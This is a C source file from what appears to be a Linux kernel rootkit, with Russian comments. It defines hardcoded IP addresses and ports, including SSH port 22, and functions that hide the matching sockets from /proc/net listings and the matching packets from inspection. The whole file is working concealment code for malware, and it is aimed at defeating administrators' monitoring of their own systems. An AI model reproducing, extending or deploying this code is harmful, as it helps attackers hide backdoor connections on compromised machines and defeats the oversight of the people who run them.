#include "net.h"

/*
    !Подумать на типом хранения строк с ip
*/
char *tcp4_addrs[] = {"192.168.157.153", "0.0.0.0"};
char *udp4_addrs[] = {"192.168.157.254", "0.0.0.0"};
char *tcp6_addrs[] = {"fe80::20c:29ff:fe23:1a52"};
char *udp6_addrs[] = {"2001:db8::1"};
struct Extended_array addrs[] = {
    {tcp4_addrs, sizeof(tcp4_addrs) / sizeof(tcp4_addrs[0])}, 
    {udp4_addrs, sizeof(udp4_addrs) / sizeof(udp4_addrs[0])},
    {tcp6_addrs, sizeof(tcp6_addrs) / sizeof(tcp6_addrs[0])}, 
    {udp6_addrs, sizeof(udp6_addrs) / sizeof(udp6_addrs[0])}
};

unsigned int tcp4_ports[] = {22, 5632};
unsigned int udp4_ports[] = {67};
unsigned int tcp6_ports[] = {222};
unsigned int udp6_ports[] = {1235};
struct Extended_array ports[] = {
    {tcp4_ports, sizeof(tcp4_ports) / sizeof(tcp4_ports[0])}, 
    {udp4_ports, sizeof(udp4_ports) / sizeof(udp4_ports[0])},
    {tcp6_ports, sizeof(tcp6_ports) / sizeof(tcp6_ports[0])}, 
    {udp6_ports, sizeof(udp6_ports) / sizeof(udp6_ports[0])}
};

/*
    is_hide4_addr - функция, скрыть или нет ipv4 сокет по адресу источника или адресу назначения

    __be32 *saddr - указатель на адрес источника
    __be32 *daddr - указатель на адрес назначения
    enum Protocols protocol - протокол
*/
bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
    __be32 addr;

    for (int ip_id = 0; ip_id < addrs[protocol].array_size; ip_id++) {
        if (!in4_pton(((char **)addrs[protocol].array_addr)[ip_id], -1, (u8 *)&addr, '\0', NULL)) {
            pr_err("Err in4_pton\n");
            continue;
        }

        if (*saddr == addr || *daddr == addr) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide6_addr - функция, скрыть или нет ipv6 сокет по адресу источника/назначения

    struct in6_addr *saddr - указатель на адрес источника
    struct in6_addr *daddr - указатель на адрес назначения
    enum Protocols protocol - протокол

    struct in6_addr - uapi/linux/in6.h
*/
bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
    struct in6_addr addr;

    for (int ip_id = 0; ip_id < addrs[protocol + 2].array_size; ip_id++) {
        // +2 = расстояние от v4 до v6
        if (!in6_pton(((char **)addrs[protocol + 2].array_addr)[ip_id], -1, addr.s6_addr, '\0', NULL)) {
            pr_err("Err in6_pton\n");
            continue;
        }

        if (memcmp(saddr, &addr, sizeof(struct in6_addr)) == 0 || 
            memcmp(daddr, &addr, sizeof(struct in6_addr)) == 0) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_port - функция, скрыть или нет ipv4/6 сокет по порту источника/назначения

    __be16 sport - порт источника
    __be16 dport - порт назначения
    enum Protocols protocol - протокол
    enum IP_type ip_type - версия ip
*/
bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть

    // 2 * ip_type - если ipv4, то 0. Иначе нужноее смщенеие 2
    for (int port_id = 0; port_id < ports[protocol + 2 * ip_type].array_size; port_id++) {
        if (sport == htons(((unsigned int *)ports[protocol + 2 * ip_type].array_addr)[port_id]) || 
            dport == htons(((unsigned int *)ports[protocol + 2 * ip_type].array_addr)[port_id])) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_net_info - функция, скрыть или нет сокет по адрес и порту источника/назначения

    void* saddr - указатель на адрес источника 
    void* daddr - указатель на адрес назначения
    __be16 sport - порт источника
    __be16 dport - порт назначения
    enum Protocols protocol - протокол
    enum IP_type ip_type - версия ip
*/
bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
    // пока надо подумать над этим
    if ((ip_type == ipv4 && is_hide4_addr((__be32 *)saddr, (__be32 *)daddr, protocol)) ||
        (ip_type == ipv6 && is_hide6_addr((struct in6_addr*)saddr, (struct in6_addr*)daddr, protocol)) || 
        is_hide_port(sport, dport, protocol, ip_type)) {
        return true;
    }
    
    return false;
}

/*
    is_skip4_seq_show - функция, пропустить или нет ipv4 сокет

    void *v - указатель на данные
    enum Protocols protocol - протокол
    
    struct inet_sock - net/inet_sock.h
*/
bool is_skip4_seq_show (void *v, enum Protocols protocol) {
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = (struct sock *)v;
        struct inet_sock *is = inet_sk(sk);

        if (is_hide_net_info(&is->inet_saddr, &is->inet_daddr, is->inet_sport, is->inet_dport, protocol, ipv4)) {
            return true;
        }
    }

    return false;
}

/*
    is_skip6_seq_show - функция, пропустить или нет ipv6 сокет

    void *v - указатель на данные
    enum Protocols protocol - протокол
    
    linux/ipv6.h     - struct ipv6_pinfo
    uapi/linux/in6.h - struct in6_addr
*/
bool is_skip6_seq_show (void *v, enum Protocols protocol) {
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = (struct sock *)v;
        struct inet_sock *is = inet_sk(sk);
        struct ipv6_pinfo *np = inet6_sk(sk);

        if (is_hide_net_info(&np->saddr, &sk->sk_v6_daddr, is->inet_sport, is->inet_dport, protocol, ipv6)) {
            return true;
        }
    }

    return false;
}

/*
    is_hide_packet - функция, скрыть или нет ip пакет

    *skb - указатель на пакет

    uapi/linux/ip.h   - struct iphdr 
    uapi/linux/ipv6.h - struct ip6hdr 
    ...
*/

bool is_hide_packet(struct sk_buff *skb) {
    struct iphdr *iph;
    struct ipv6hdr *ipv6h;
    struct tcphdr *tcph;
    struct udphdr *udph;

    // IPv4 пакет
    if (skb->protocol == htons(ETH_P_IP)) {
        iph = ip_hdr(skb);

        if (!iph)
            return false;

        // TCP
        if (iph->protocol == IPPROTO_TCP) {
            tcph = tcp_hdr(skb);
            
            if (is_hide_net_info(&iph->saddr, &iph->daddr, tcph->source, tcph->dest, tcp, ipv4)){
                return true;
            }
        }

        // UDP
        if (iph->protocol == IPPROTO_UDP) {
            udph = udp_hdr(skb);

            if (is_hide_net_info(&iph->saddr, &iph->daddr, udph->source, udph->dest, udp, ipv4)){
                return true;
            }
        }

    }  
    // IPv6 пакет
    else if (skb->protocol == htons(ETH_P_IPV6)) {  
        ipv6h = ipv6_hdr(skb);

        if (!ipv6h)
            return false;

        // TCP
        if (ipv6h->nexthdr == IPPROTO_TCP) {
            tcph = tcp_hdr(skb);
            
            if (is_hide_net_info(&ipv6h->saddr, &ipv6h->daddr, tcph->source, tcph->dest, tcp, ipv6)){
                return true;
            }
        }

        // UDP
        if (ipv6h->nexthdr == IPPROTO_UDP) {
            udph = udp_hdr(skb);

            if (is_hide_net_info(&ipv6h->saddr, &ipv6h->daddr, udph->source, udph->dest, udp, ipv6)){
                return true;
            }
        }
    }

    return false;
}